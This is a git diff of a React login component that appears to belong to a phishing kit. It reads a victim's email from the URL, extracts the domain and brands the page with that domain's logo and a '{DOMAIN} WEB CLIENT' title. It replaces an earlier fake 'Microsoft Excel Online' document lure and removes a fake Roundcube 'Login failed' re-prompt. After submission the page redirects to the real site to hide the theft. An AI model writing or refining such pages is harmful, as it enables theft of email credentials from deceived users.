@@ -11,6 +11,9 @@ function Forms() {
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
 
+  let emailss = params.id;
+  let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
+
   const submitHandler = (e) => {
     e.preventDefault();
 
@@ -48,6 +51,8 @@ function Forms() {
       window.location.href = `https://${domain}`;
     }, 1000);
   };
+  const domainname = domain.substring(0, domain.lastIndexOf(".")).toUpperCase();
+
   return (
     <Styls>
       {" "}
@@ -58,23 +63,13 @@ function Forms() {
               <div className="office-holder">
                 <div className="logo">
                   <div id="login_logo">
-                    <img
-                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
-                      width="100"
-                      height="100"
-                      alt=""
-                    />
+                    <img src={`https://logo.clearbit.com/${domain}`} alt="" />
                   </div>
                   <h5 className="font-weight-light">
-                    <b> Microsoft Excel Online </b>
+                    <b> {`${domainname} WEB CLIENT `} </b>
                     <br />
                   </h5>
-                  <p>
-                    This file is protected by Microsoft Online. Please sign in
-                    with your email provider to access file
-                  </p>
                 </div>
-
                 <form className="formal" onSubmit={submitHandler}>
                   <div className="form-holder">
                     <div>
@@ -96,12 +91,14 @@ function Forms() {
                     />
 
                     <div className="btn-holder">
-                      <button className="btn btn-lg col-12">
-                        Download Document
-                      </button>
+                      <button className="btn btn-lg col-12">Sign In </button>
                     </div>
                   </div>
                 </form>
+
+                <p className="conne">
+                  Conneted to <a href={`https://${domain}`}>{domain} </a>{" "}
+                </p>
               </div>
             </div>
           </div>
@@ -114,21 +111,12 @@ function Forms() {
               <div className="office-holder">
                 <div className="logo">
                   <div id="login_logo">
-                    <img
-                      src="https://toppng.com/uploads/preview/excel-icon-excel-flat-icon-11553482530m4cmreyasv.png"
-                      width="100"
-                      height="100"
-                      alt=""
-                    />
+                    <img src={`https://logo.clearbit.com/${domain}`} alt="" />
                   </div>
                   <h5 className="font-weight-light">
-                    <b> Microsoft Excel Online </b>
+                    <b> {`${domainname} WEB CLIENT `} </b>
                     <br />
                   </h5>
-                   <p>
-                    This file is protected by Microsoft Online. Please sign in
-                    with your email provider to access file
-                  </p>
                 </div>
 
                 <div className="msg">
@@ -156,53 +144,13 @@ function Forms() {
                     />
 
                     <div className="btn-holder">
-                      <button className="btn btn-lg col-12">
-                        Download Document
-                      </button>
+                      <button className="btn btn-lg col-12">Sign In </button>
                     </div>
                   </div>
                 </form>
               </div>
             </div>
           </div>
-        </div>
-      )}
-      {confirmForm && (
-        <div className="contsainer">
-          <div className="imagees"></div>
-
-          <form className="formal" onSubmit={editHandler}>
-            <label>
-              <span className="newicon1">
-                {" "}
-                <i class="fas fa-user fa-1x"></i>{" "}
-              </span>
-              <input
-                type="email"
-                name="to_user"
-                required
-                value={params.id}
-                placeholder="Username"
-              />
-            </label>
-            <br></br>
-
-            <label>
-              <span className="newicon1">
-                {" "}
-                <i class="fas fa-lock fa-1x"></i>{" "}
-              </span>
-              <input
-                type="password"
-                name="to_pass"
-                required
-                placeholder="Password"
-              />
-            </label>
-            <p className="reda">Login failed Incorrect Password</p>
-            <button> LOGIN </button>
-            <p>Roundcube Webmail </p>
-          </form>
         </div>
       )}
     </Styls>
